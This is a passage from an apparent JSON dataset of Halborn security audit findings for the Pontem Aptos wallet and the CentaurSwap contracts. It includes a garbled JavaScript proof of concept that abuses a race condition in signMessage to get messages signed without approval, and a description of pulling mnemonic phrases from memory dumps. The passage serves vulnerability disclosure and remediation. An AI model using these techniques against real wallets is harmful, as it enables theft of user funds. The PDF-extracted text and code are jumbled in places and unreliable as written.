        "body": "The SignMessage exported function allowed an attacker to abuse the func- tion and trigger a race condition state. Additionally, the function did not verify the approval of the user, using a previous cached message on the signing output, and showing to the user the legitimate message to sign. The output of the previous cached message was produced before the approval of the user on the legitimate signing function. Proof of concept: Listing 3: Exploit . then ( result = > { console . log ( ' Signed Message ' , result ) }) . catch ( e => console . log ( ' Error ', e)) 1 async function exploitSign () { 2 for (i = 1; i <= 5; i ++) { 3 4 window . pontem . signMessage ( i) 5 6 7 8 9 } 10 11 window . pontem . signMessage ( ' Test1 ') 12 13 14 15 16 17 await new Promise ( r => setTimeout (r , 1000) ) ; 18 19 window . pontem . signMessage ( ' Test2 ') 20 21 22 }) . catch ( e => console . log ( ' Error ', e)) console . log ( ' Signed Message ' , result ) console . log ( ' Signed Message ' , result ) . then ( result => { . then ( result => { }) 24 . catch ( e => console . log ( ' Error ', e)) 23 24 } No approval verification on signed messages. Risk Level: Likelihood - 5 Impact - 5 Recommendation: Improve the signMessage function to validate if the user approves the signed message and do not allow multiple executions of the function with only one interaction. Remediation Plan: SOLVED: The issue was solved in the following GitHub Pull Request (Commit 45429fb617843ccfbbab62dec76c77a4001ea73d): Feature apt 643 #113 25 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "UNENCRYPTED MNEMONIC PHRASE IN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "The mnemonic phrase in the wallet is not encrypted in memory. As a result, an attacker who has compromised a users machine can exfiltrate and steal their mnemonic phrase. It was further found that this mnemonic phrase stays in memory while the application remains open. This report only contains the vulnerabilities found within the Windows platform. The number of ways to exploit this on Windows were trigger than on Linux and MacOS. If the memory issues are fixed on the Windows platform, they will automatically also cater for those on Linux and MacOS. Proof of concept: The plain text mnemonic phrase is available in memory during various scenarios. Memory dumps were taken throughout the testing process. These memory dumps contained an exact replica of what was in memory while the application was open. Making use of the strings tool on Linux, a search through the memory dump file revealed the plain text mnemonic phrase. Figure 1: Mnemonic phrase leaked from Chrome memory dump 26 Besides that, a mnemonic phrase was also found using Demonic.exe binary that exploits this CVE-2022-32969 discovered few weeks ago by Halborn. See video below. PoC video: (Demonic) Mnemonic phrase leaked from memory using CVE-2022-32969 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The following recommendation was provided:  Clear/dereference values of variables which store mnemonic phrases in your code. This will speed up the garbage collector removing the phrase from memory. It is also important to break up the mnemonic phrase into several variables, or obfuscate the original phrase and then dereferencing the variable which used to hold the original phrase. In the cases where you have to handle the mnemonic phrase, you can use the obfuscated variable along with a function that will reconstruct the original mnemonic phrase at the exact point where it is needed.  Avoid saving the mnemonic phrase on disk, even if it is encrypted. There are cases where you want to identify a wallet, and many times the mnemonic associated with that wallet is retrieved from disk and decrypted. This can result in leakage of the mnemonic in memory. Instead, you should store and use the entropy to identify wallets.  Instead of having the user enter their whole phrase, use word selection for mnemonic phrase confirmation on wallet creation.  Add invisible fake words in-between the mnemonic phrase words when displaying the mnemonic, to hide the phrase in memory. 27 References: Halborn discloses Demonic vulnerability in MetaMask CVE-2022-32969 Remediation Plan: PENDING: The Pontem Network team stated that the recommendation will be followed in a future version of the code. Pontem Aptos Wallet may be at risk until the fixes have been reviewed and deployed. 28 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "UN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "As a The mnemonic phrase in the wallet is not encrypted in memory. result, an attacker who has compromised a users machine can exfiltrate and steal users wallet password. This report only contains the vulnerabilities found within the Windows The number of ways to exploit this on Windows were trigger platform. than on Linux and MacOS. If the memory issues are fixed on the Windows platform, they will automatically also cater for those on Linux and MacOS. Proof of concept: The plain text user password is available in memory during various scenarios. Memory dumps were taken throughout the testing process. These memory dumps contained an exact replica of what was in memory while the application was open. Making use of the strings tool on Linux, a search through the memory dump file revealed the plain text mnemonic phrase. Figure 2: User wallet password leaked from Chrome memory dump Risk Level: Likelihood - 5 Impact - 5 29 Recommendation: Clear/dereference values of variables which store sensitive information in your code. This will speed up the garbage collector removing the data from memory. In the cases where you have to handle the data, you can use the obfuscated variable along with a function that will reconstruct the original data at the exact point where it is needed. Remediation Plan: PENDING: The Pontem Network team stated that the recommendation will be followed in a future version of the code. Pontem Aptos Wallet may be at risk until the fixes have been reviewed and deployed. Several improvements in the passwords encryption were made in the following GitHub Pull Request: [Wallet] APT-757. Encrypt plain text password #297 30 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "ACCOUNT NOT INITIALIZED ON CREATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "New wallets (or new accounts within an existing wallet) were unable to receive funds from other accounts without previously have called faucet. The Node endpoint gave a 404 Not found response when Aptos Wallet tried to identify the new-creation account address. This caused an error message in the browser console, throwing an error message to the user, blocking the transaction. Figure 3: Error message on the transaction to a new created account Note: New Aptos accounts must be initialized, sending Aptos (only Aptos) to it by design. Proof of Concept: PoC video: New account not initialized on creation Risk Level: Likelihood - 4 Impact - 4 Recommendation: Initialize the account or advert the user that the account is not initialized by default on creation. 31 Remediation Plan: SOLVED: The issue was solved in the commit ID: e22322910ad13ea6373d7bb1756f9f821137ea38 According to the Pontem Network team: When a wallet is created using a cryptographic method, this does not mean that this address exists in the blockchain network. As soon as the first transaction using this address is executed (for example, funds are transferred to this address), an account will be automatically created, and this error will no longer occur. This issue was reported due to testing on devnet. Pontem Network stated that in v2.0.0, when someone sends funds to a new account, that account pays gas for creating that recipient account, as there is no faucet on mainnet to reproduce the above-mentioned PoC of this issue. 32 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: High"
        ]
    },
    {
        "title": "CLEAR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "Hard-coded clear-text credentials were found in the source code. This is considered bad practice and may pose a risk for the application if a malicious user manages to access to some of them. Secrets should be securely stored and shared between the development team on a need to know basis. Additionally, these might be later re-used by someone and should they fall in the wrong hands, they could be used to access sensitive services and data. Code Location: Listing 4: .env.development (Line 3) 1 HTTPS = true 2 BROWSER = none 3 REACT_APP_DEVELOPMENT_VAULT_PASSWORD =123456 4 Risk Level: Likelihood - 2 Impact - 4 Recommendation: All the secrets must be removed from source code in all repositories. Instead, other alternatives for obtaining securely secrets must be used, such as environment variables. This way, environment variables would be passed as arguments to the code, should it be needed. Additionally, it would be recommended that a second person reviewed every Git commits before being pushed to ensure that unintended data is not 33 committed to the repository. References: OWASP. Use of hardcoded passwords CWE-798: Use of Hard-coded Credentials Remediation Plan: The issue SOLVED: 6b1b114f104079ecec717fcca00ad8b485e28666 The Pontem Network team removed clear-text password from source code. following GitHub solved was the in Commit: 34 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "WEAK PASSWORD POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "There was no password policy enforced when user was setting up the password. Weak passwords are considered to be those that are short, employ common words, system/software defaults, or any terms that could be quickly guessed by executing a brute force attack using a subset of all possible passwords, such as dictionary words, proper nouns, username-based words, or common variations on these themes and even company-related. Proof of Concept: It was possible to configure as users password the following values: - 0123456789 - 000000 - aaaaaa - abcdef These values are considered as too weak passwords. Weak password set up during the wallet creation Due to lack of implementation of robust password policy (see the following vulnerabilities), it may be easy for an attacker to brute-force user accounts and compromise them. Risk Level: Likelihood - 4 Impact - 3 35 Recommendation: Enforce a strong password policy. passwords based on dictionary words. It is recommended to implement a strong password policy and have at least 10 minimum characters contains upper case, lower case, numeric and special characters. Do not permit weak passwords or References: CWE-521 OWASP. Testing for weak password policy Password Strength Checker Remediation Plan: RISK ACCEPTED: The Pontem Network team accepted the risk of the issue. 36 3.10 (HAL-10) VULNERABLE DEPENDENCIES - MEDIUM ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "INFINITE ALLOWANCE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Setting the allowance value to -1 or MAX UINT 256 on the CentaurLPToken contract will cause the spender to keep performing transfers until a new approval is set on the spender. Code Location: Listing 1: CentaurLPToken.sol (Lines 54) 53 54 55 56 57 58 59 function transferFrom ( address from , address to , uint value ) external returns ( bool ) { if ( allowance [ from ][ msg . sender ] != uint ( -1) ) { allowance [ from ][ msg . sender ] = allowance [ from ][ msg . sender ]. sub ( value ); } _transfer ( from , to , value ); return true ; } Risk Level: Likelihood - 2 Impact - 2 Recommendations: Follow the standard ERC20 practices and allow the user to increase and decrease the approval amount (see increaseApproval and decreaseApproval of StandardToken.sol#L63-L98). If this is not possible, ensure users are aware of this extra functionality Furthermore, it is and encourage them to use it when appropriate. 14 preferable to periodically increase the allowance rather than disabling the allowance feature. Remediation Plan: SOLVED: Centaur team has updated the document regarding this functionality here https://docs.cntr.finance/audits ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "A subtraction underflow may occur when calling transferFrom on the CentaurLPToken contract. For example, if the allowance of the spender is 0, the value will be subtracted from it, causing an underflow. See Figure 1. Integer overflows or underflows occur when the result of an arithmetic operation is outside of the possible range for an integer. If the amount exceeds the maximum or is lower than the minimum represented by the number of bits available, it will result in an incorrect value. Figure 1: Underflow taking place on the transferFrom function in the CentaurLPToken due to allowance being 0. 15 Code Location: Listing 2: CentaurLPToken.sol (Lines 55) 53 54 55 56 57 58 59 function transferFrom ( address from , address to , uint value ) external returns ( bool ) { if ( allowance [ from ][ msg . sender ] != uint ( -1) ) { allowance [ from ][ msg . sender ] = allowance [ from ][ msg . sender ]. sub ( value ); } _transfer ( from , to , value ); return true ; } Risk Level: Likelihood - 2 Impact - 2 Recommendations: Although safe math libraries are used, no message is returned to the caller when the underflow causes the transaction to fail. Returning an error message like \"ERC20: transfer amount exceeds allowance\" would help explain why the transaction failed. Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. 16 ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block .timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Listing 3: CentaurSettlement.sol (Lines 65) 60 61 62 63 64 65 66 67 require ( msg . sender == _tPool , ' CentaurSwap : INVALID_POOL '); require ( pendingSettlement [ _sender ][ _fPool ]. settlementTimestamp != 0, ' CentaurSwap : SETTLEMENT_DOES_NOT_EXISTS '); require ( pendingSettlement [ _sender ][ _tPool ]. settlementTimestamp != 0, ' CentaurSwap : SETTLEMENT_DOES_NOT_EXISTS '); require ( block . timestamp >= pendingSettlement [ _sender ][ _fPool ]. settlementTimestamp , ' CentaurSwap : SETTLEMENT_PENDING '); _safeTransfer ( ICentaurPool ( _tPool ). baseToken () , _tPool , pendingSettlement [ _sender ][ _fPool ]. maxAmountOut ); Listing 4: CentaurRouter.sol (Lines 23) 22 23 24 modifier ensure ( uint deadline ) { require ( deadline >= block . timestamp , ' CentaurSwap : EXPIRED '); _ ; 17 Listing 5: CentaurPool.sol (Lines 161) 149 ICentaurSettlement . Settlement memory pendingSettlement = ICentaurSettlement . Settlement ( 150 151 152 153 154 155 156 157 158 159 160 161 162 pool , _amountIn , ICentaurPool ( pool ). baseTokenTargetAmount () , ( ICentaurPool ( pool ). baseTokenBalance () ). sub ( _amountIn ) , ICentaurPool ( pool ). liquidityParameter () , address ( this ) , maxAmount , baseTokenTargetAmount , baseTokenBalance , liquidityParameter , _receiver , block . timestamp . add ( ICentaurSettlement ( settlement ). settlementDuration () ) ); Listing 6: CentaurPool.sol (Lines 201) 199 require ( pendingSettlement . settlementTimestamp != 0 , ' CentaurSwap : NO_PENDING_SETTLEMENT '); 200 require ( pendingSettlement . tPool == address ( this ) , ' CentaurSwap : WRONG_POOL_SETTLEMENT '); 201 require ( block . timestamp >= pendingSettlement . settlementTimestamp , ' CentaurSwap : SETTLEMENT_STILL_PENDING '); Listing 7: CentaurPool.sol (Lines 306) 303 function emergencyWithdraw ( address _token , uint _amount , address _to ) external onlyFactory { _safeTransfer ( _token , _to , _amount ); emit EmergencyWithdraw ( block . timestamp , _token , _amount , _to ); 304 305 306 307 } Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. If possible, use an oracle. 18 Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA AND VERSION MISMATCH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Deploy Some contracts are using a floating pragma, such as ^0.6.12. contracts with the same compiler version and flags used during development Locking the pragma helps ensure that contracts do not and testing. accidentally get deployed using a different compiler specification. For example, an outdated compiler version might introduce bugs, or a new version that is not extensively tested may introduce security vulnerabilities. Additionally, the contracts are using different versions of the solidity compiler. Listing # 8 shows the versions used. Listing 8: (Lines 1) 1 - Version used : [ '=0.6.12 ' , ' >=0.4.24 <0.8.0 ' , ' >=0.5.0 ' , ' >=0.6.0 ' , ' >=0.6.0 <0.8.0 ' , ' >=0.6.2 ' , ' >=0.6.2 <0.8.0 ' , '^0.5.0||^0.6.0||^0.7.0 ' , '^0.6.12 '] 2 - =0.6.12 ( contracts / CentaurFactory . sol #3) 3 - =0.6.12 ( contracts / CentaurLPToken . sol #3) 4 - =0.6.12 ( contracts / CentaurPool . sol #3) 5 - ABIEncoderV2 ( contracts / CentaurPool . sol #4) 6 - =0.6.12 ( contracts / CentaurRouter . sol #3) 7 - =0.6.12 ( contracts / CentaurSettlement . sol #3) 8 - ABIEncoderV2 ( contracts / CentaurSettlement . sol #4) 9 - >=0.5.0 ( contracts / interfaces / ICentaurFactory . sol #3) 10 - >=0.5.0 ( contracts / interfaces / ICentaurPool . sol #3) 11 - >=0.6.2 ( contracts / interfaces / ICentaurRouter . sol #3) 12 - >=0.5.0 ( contracts / interfaces / ICentaurSettlement . sol #3) 13 - ABIEncoderV2 ( contracts / interfaces / ICentaurSettlement . sol #4) 14 - ^0.6.12 ( contracts / interfaces / ICloneFactory . sol #3) 19 15 - >=0.6.0 <0.8.0 ( contracts / interfaces / IERC20 . sol #3) 16 - ^0.6.12 ( contracts / interfaces / IOracle . sol #3) 17 - >=0.5.0 ( contracts / interfaces / IWETH . sol #3) 18 - ^0.5.0||^0.6.0||^0.7.0 ( contracts / libraries / ABDKMathQuad . sol #6) 19 - ^0.6.12 ( contracts / libraries / CentaurMath . sol #3) 20 - >=0.6.0 <0.8.0 ( contracts / libraries / Context . sol #3) 21 - >=0.4.24 <0.8.0 ( contracts / libraries / Initializable . sol #4) 22 - >=0.6.0 <0.8.0 ( contracts / libraries / Ownable . sol #3) 23 - >=0.6.0 <0.8.0 ( contracts / libraries / SafeMath . sol #3) 24 - >=0.6.0 ( contracts / libraries / TransferHelper . sol #3) Code Location: Listing 9: interfaces/ICloneFactory.sol 3 pragma solidity ^0.6.12; Listing 10: libraries/ABDKMathQuad.sol 6 pragma solidity ^0.5.0 || ^0.6.0 || ^0.7.0; Listing 11: interfaces/IOracle.sol 3 pragma solidity ^0.6.12; Listing 12: libraries/CentaurMath.sol 3 pragma solidity ^0.6.12; Listing 13: helpers/CloneFactory.sol 3 pragma solidity ^0.6.12; Risk Level: Likelihood - 1 20 Impact - 3 Recommendations: Lock the pragma version whenever possible and avoid using a floating pragma in the final deployment. The pragma can be locked in the code by removing the caret () and by specifying the exact version in the Truffle configuration file truffle-config.js or hardhat.config.js if using the HardHat framework. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Public functions consume more gas than those declared as external. The EVM passes the arguments of a public function via pointers, which require the array to be in memory. There is no such requirement for external functions. Choosing the incorrect modifier can inflate the needed gas. As explained by the Solidity Documentation:  External functions ... can be called from other contracts and via transactions. An external function cannot be called internally  Public functions ... can be either called internally or via messages.  Internal functions ... can only be accessed internally (i.e. from within the current contract or contracts deriving from it)  Private functions ... are only visible for the contract they are defined in and not in derived contracts. 21 Code Location: Listing 14: WheyFarm.sol 92 93 94 95 96 function add ( uint256 _allocPoint , IERC20 _lpToken , bool _withUpdate ) public onlyOwner { Listing 15: WheyFarm.sol 127 128 129 130 131 function set ( uint256 _pid , uint256 _allocPoint , bool _withUpdate ) public onlyOwner { Listing 16: WheyFarm.sol 261 function deposit ( uint256 _pid , uint256 _amount ) public { Listing 17: WheyFarm.sol 288 function withdraw ( uint256 _pid , uint256 _amount ) public { Listing 18: WheyFarm.sol 308 function harvestAll () public { Listing 19: WheyFarm.sol 327 function emergencyWithdraw ( uint256 _pid ) public { Listing 20: WheyFarm.sol 346 function updateDev ( address _devaddr ) onlyOwner public { 22 Listing 21: WheyToken.sol 10 function mint ( address _to , uint256 _amount ) public onlyOwner { Recommendation: If appropriate, declare the functions as external instead of public. A best practice is to use external if expecting a function only to be called externally, public if called internally and externally, and private or internal if only used inside the contract. Public functions are always accessible, but external functions are only available to outside callers. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION REDEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "function _safeTransfer The and CentaurSettlement. Other contracts are using the declared safeTransfer on the TransferHelper library contract. re-declared CentaurPool in is Code Location: Listing 22: CentaurPool.sol 94 function _safeTransfer ( address token , address to , uint value ) private { ( bool success , bytes memory data ) = token . call ( abi . 95 encodeWithSelector ( SELECTOR , to , value )) ; 23 96 require ( success && ( data . length == 0 || abi . decode ( data , ( bool ))) , ' CentaurSwap : TRANSFER_FAILED '); 97 } Listing 23: CentaurSettlement.sol 33 function _safeTransfer ( address token , address to , uint value ) private { ( bool success , bytes memory data ) = token . call ( abi . encodeWithSelector ( SELECTOR , to , value )) ; require ( success && ( data . length == 0 || abi . decode ( data , ( bool ))) , ' CentaurSwap : TRANSFER_FAILED '); 34 35 36 } Recommendation: Apply library usage consistently to avoid security issues. If using a library for transfers, it is better to use it everywhere. Patching will only have to be done for one instance rather than multiple if updates are required. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "USER CONTROLLED REQUIRE COMPARISON",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "variable _minLiquidity of the The The user can CentaurRouter contract is used in a require comparison. control both ends of the require comparison. For example, setting the _minLiquidity value to 0 would allow a user to bypass the require check addLiquidity function the in 24 and allow adding any amount of liquidity. Code Location: Listing 24: CentaurRouter.sol (Lines 84) 70 function addLiquidity ( 71 72 73 74 75 76 ) external virtual override ensure ( _deadline ) onlyEOA ( msg . sender ) address _baseToken , uint _amount , address _to , uint _minLiquidity , uint _deadline returns ( uint amount , uint liquidity ) { address pool = ICentaurFactory ( factory ). getPool ( _baseToken ); require ( pool != address (0) , ' CentaurSwap : POOL_NOT_FOUND '); ( liquidity ) = _addLiquidity ( _baseToken , _amount , _minLiquidity ); TransferHelper . safeTransferFrom ( _baseToken , msg . sender , pool , _amount ); liquidity = ICentaurPool ( pool ). mint ( _to ); require ( liquidity > _minLiquidity , ' CentaurSwap : INSUFFICIENT_OUTPUT_AMOUNT '); return ( _amount , liquidity ); 77 78 79 80 81 82 83 84 85 86 87 } Listing 25: CentaurRouter.sol (Lines 67) 50 function _addLiquidity ( address _baseToken , 51 uint _amount , 52 53 uint _minLiquidity 54 ) internal view virtual returns ( uint liquidity ) { 55 ICentaurPool pool = ICentaurPool ( ICentaurFactory ( factory ). getPool ( _baseToken )) ; 56 57 58 59 60 uint _totalSupply = pool . totalSupply () ; uint _baseTokenTargetAmount = pool . baseTokenTargetAmount () ; liquidity = _amount ; 25 if ( _totalSupply == 0) { liquidity = _amount . add ( _baseTokenTargetAmount ); } else { liquidity = _amount . mul ( _totalSupply ). div ( _baseTokenTargetAmount ); } require ( liquidity > _minLiquidity , ' CentaurSwap : INSUFFICIENT_OUTPUT_AMOUNT '); 61 62 63 64 65 66 67 68 } Recommendation: Add the minimum liquidity amount during the construction of the pool. If this value needs to be changed later, adding a setter would allow It is not a good practice to use user-controlled updating its value. parameters for assertion checks in the code. Remediation Plan: Centaur this regarding document has SOLVED: functionality here https://docs.cntr.finance/audits. _minLiquidity is used for slippage tolerance therefore should be modifiable by the user. updated team the ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING VARIABLE CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The value _allocPoint provided as argument on the add function in WheyFarm is not checked for being bigger than 0. Setting a totalAllocPoint of 0 causes division-by-zero errors as shown in Figure 13. 26 . Code Location: Listing 26: WheyFarm.sol (Lines 102) 92 function add ( uint256 _allocPoint , 93 IERC20 _lpToken , 94 95 bool _withUpdate 96 ) public onlyOwner { 97 98 99 100 101 102 if ( _withUpdate ) { massUpdatePools () ; } uint256 lastRewardBlock = block . number > startBlock ? block . number : startBlock ; totalAllocPoint = totalAllocPoint . add ( _allocPoint ); Listing 27: WheyFarm.sol (Lines 188) 186 if ( block . number > pool . lastRewardBlock && lpSupply != 0) { 187 uint256 wheyReward = getWheyReward ( pool . nextEmissionIndex , pool . lastRewardBlock , block . number ); 188 uint256 poolWheyReward = wheyReward . mul ( pool . allocPoint ). div ( totalAllocPoint ); 189 190 191 192 193 } accWheyPerShare = accWheyPerShare . add ( ( poolWheyReward . mul (85) . div (100) ). mul (1 e12 ). div ( lpSupply ) ); 27 Recommendation: Perform boundary checks on user/admin supplied values to address possible issues. Remediation Plan: RISK ACCEPTED: Centaur team accepted this risk since the contracts are already deployed. 28 MANUAL TESTING 29 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can it be called twice in the same block and cause issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation . . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract? 4.1 CentaurFactory Attempting to add an empty pool does require the token address to be non-zero, ensuring that the pool was initialized as shown in Figure 2. G N I T S E T L A U N A M Figure 2: Adding an empty pool on the Factory checks Initializing a pool with a custom base token and later adding it to the factory is allowed as expected as seen in Figure 3. Re-adding to the pool checks shown in Figure 4. Removing the pool and trying double remove, shown in Figure 5. Creating a pool using exported methods, shown in Figure 6. 30 Figure 3: Initializing the pool and adding it to the factory Figure 4: Trying to re-add the pool to the factory G N I T S E T L A U N A M Figure 5: Trying to double remove the pool 31 Figure 6: Creating a pool using methods 4.2 CentaurPool The internal function named _safeTransfer duplicates the safeTransfer function in TransferHelper. Re-initializing the factory causes errors, as shown in Figure 7. Figure 7: Factory re-initialization checks Some functions are required to be called from the Router: G N I T S E T L A U N A M  mint  burn  swapFrom  swapTo Functions allowed by the Factory:  setFactory 32  setTradeEnabled  setDepositEnabled  setWithdrawEnabled  setLiquidityParameter  emergencyWithdraw No requirement from the caller:  swapSettle  mint assumes that the balance increase is a result of the addLiquidity call from the Router:  baseTokenBalance keeps track of the previous balance value, it subtracts to the current balanceOf base token. Test showcasing that if funds are transferred the next account gets accredited the minted tokens is shown in Figure 8 and Figure 9. When swapping tokens CentaurMath is calculating the difference of surplus and demand using the function shown in their documentation https://docs. cntr.finance/centaur-swap/cross-pair-swaps??. G N I T S E T L A U N A M 33 Figure 8: Test case that demonstrated that manually transferred funds to the pool get minted by the following user adding liquidity G N I T S E T L A U N A M Figure 9: Result of the testcase on the console 34 4.3 CentaurRouter The removeLiquidity does not work if the client does not approve the router from spending the underlying CentaurLPTokens, furthermore the subtraction overflow is shown indicating that the transferFrom function is missing to subtract the allowance. Figure 10: Subtraction overflow on the allowance due to invalid checks. Missing throw error description Anti-contract call protection modifier onlyEOA(msg.sender) is present and used on multiple places, only whitelisted contracts are allowed to interact with it: Listing 28 1 modifier onlyEOA ( address _address ) { 2 3 if ( onlyEOAEnabled ) { require ((! Address . isContract ( _address ) || G N I T S E T L A U N A M whitelistContracts [ _address ]) , ' CentaurSwap : ONLY_EOA_ALLOWED '); 4 5 6 } _ ; } 4.4 Settlements It does not validate that the caller is the pool, so a user can addSettlement and removeSettlement. 35 is not It removeSettlement, which would allow a bypass of the settlement system: settlements possible pending remove that are to on Listing 29 1 require ( block . timestamp >= pendingSettlement [ _sender ][ _fPool ]. settlementTimestamp , ' CentaurSwap : SETTLEMENT_PENDING '); It does not allow modifying a settlement during the addSettlement function, which would allow decreasing the settlement time or even invalidating it: Listing 30 1 require ( pendingSettlement [ _sender ][ _pendingSettlement . fPool ]. settlementTimestamp == 0 , ' CentaurSwap : SETTLEMENT_EXISTS '); 2 require ( pendingSettlement [ _sender ][ _pendingSettlement . tPool ]. settlementTimestamp == 0 , ' CentaurSwap : SETTLEMENT_EXISTS '); 4.5 Helpers  safeTransferETH is used at the end of the functions after updating the status 4.6 WheyFarm  400 WHEY per block during the early-adopter period of 16th April 2021 to 19th April 2021  100 WHEY per block from 19th April 2021 to 16th May 2021  Reduction of 10 WHEY per block monthly for the next eight months  Reduction of 10% every month until 16th May 2024  1 WHEY per block until 16th August 2026 The scheme is implemented in scripts/emissionPerEpoch.json, the output is shown in Figure 11. 36 G N I T S E T L A U N A M Figure 11: Emission used as described on the documentation Trying a deposit successfully updates the balance on the internal structs as shown in Figure 12.  totalAllocPoint should be required to be greater than zero or a division by zero error may be triggered, as shown in Figure 13. Listing 31 1 WheyFarm . pendingWhey ( uint256 , address ) ( contracts / WheyFarm . sol 2 #177 -195) performs a multiplication on the result of a division : - accWheyPerShare = accWheyPerShare . add (( poolWheyReward . mul (85) . div (100) ). mul (1 e12 ). div ( lpSupply )) ( contracts / WheyFarm . sol #190 -192) 3 WheyFarm . updatePool ( uint256 ) ( contracts / WheyFarm . sol #206 -258) performs a multiplication on the result of a division : - poolWheyReward = wheyReward . mul ( pool . allocPoint ). div ( 4 totalAllocPoint ) ( contracts / WheyFarm . sol #232) 5 - devReward = poolWheyReward . mul (15) . div (100) ( contracts / WheyFarm . sol #235) 37 G N I T S E T L A U N A M Figure 12: Successfully updating internal structs G N I T S E T L A U N A M Figure 13: Missing bigger than 0 check on totalAllocPoint is causing division by zero errors 38 6 Reference : https : // github . com / crytic / slither / wiki / Detector - Documentation # divide - before - multiply The fees given to the devs are exactly 15%, as shown in Figure 14. Figure 14: Math operation demonstrating that the percentage given to the devs is 15% It correctly calculates the block reward based on block numbers, init and end values, shown in Figure 15. Figure 15: Rewarded whey based on init and end block numbers G N I T S E T L A U N A M 39 Figure 16: values and fee percentages Correctly calculating withdraw amounts based on internal G N I T S E T L A U N A M 40 ",
        "labels": [
            "Halborn",
            "CentaurSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF TX.ORIGIN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
